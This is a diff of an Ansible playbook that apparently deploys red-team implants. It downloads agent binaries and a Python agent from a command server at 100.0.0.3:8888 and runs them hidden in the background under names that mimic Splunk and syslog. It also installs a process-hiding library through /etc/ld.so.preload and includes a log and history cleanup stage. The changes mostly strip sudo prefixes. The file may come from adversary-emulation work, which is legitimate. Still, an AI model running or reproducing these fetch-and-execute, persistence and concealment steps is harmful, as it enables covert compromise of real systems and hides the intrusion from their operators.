@@ -27,28 +27,28 @@
 
     # Clean up existing agents if any (optional pre-clean)
     - name: kill process splunk
-      shell: sudo pkill -9 -f splunk || true
+      shell: pkill -9 -f splunk || true
       ignore_errors: yes
 
     - name: kill process syslog
-      shell: sudo pkill -9 -f syslog || true
+      shell: pkill -9 -f syslog || true
       ignore_errors: yes
 
     - name: kill process graylog
-      shell: sudo pkill -9 -f graylog || true
+      shell: pkill -9 -f graylog || true
       ignore_errors: yes
 
     - name: kill process notlog
-      shell: sudo pkill -9 -f notlog || true
+      shell: pkill -9 -f notlog || true
       ignore_errors: yes
 
     - name: kill process ragdoll
-      shell: sudo pkill -9 -f ragdoll || true
+      shell: pkill -9 -f ragdoll || true
       ignore_errors: yes
 
     - name: Clean up any existing agents in /tmp or previous runs
       shell: |
-        sudo find /tmp/.syslogd_backup -maxdepth 4 \( \
+        find /tmp/.syslogd_backup -maxdepth 4 \( \
           -name 'splunk*' -o \
           -name 'syslog*' -o \
           -name 'graylog*' -o \
@@ -56,11 +56,6 @@
           -name 'ragdoll*' \
         \) -exec rm -rf {} + || true
       ignore_errors: yes
-  
-    - name: Clean up previous deploy
-      shell: sudo rm -r /home/john_hammon
-      ignore_errors: yes
-
 
     - name: Clean up previous kernel link
       shell: "sudo echo '' > /etc/ld.so.preload"
@@ -79,9 +74,9 @@
         server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
         for name in splunkd splunk; do
-          sudo curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
-          sudo chmod +x "$name"
-          sudo nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
+          chmod +x "$name"
+          nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
         done
 
     # HTML AGENTS (RagDoll) 
@@ -91,8 +86,8 @@
         cd {{ deploy_dir }}
         pip install -q requests beautifulsoup4
         for name in notlog-html; do
-          sudo curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > "$name.py"
-          sudo nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
+          curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > "$name.py"
+          nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
         done
 
     # TCP AGENTS (Manx)
@@ -103,9 +98,9 @@
         contact="tcp"
         cd {{ deploy_dir }}
         for name in syslog-tcp; do
-          sudo curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
-          sudo chmod +x "$name"
-          sudo nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
+          chmod +x "$name"
+          nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
         done
 
     # Build and install process hider
@@ -127,10 +122,11 @@
         chdir: "{{ deploy_dir }}"
 
     - name: Move compiled .so and update /etc/ld.so.preload
-      shell: sudo mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/
+      shell: mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/
     
     - name: echo to preload
-      shell: sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+      shell: echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload > /dev/null
+
 
     
     # Log and history cleanup
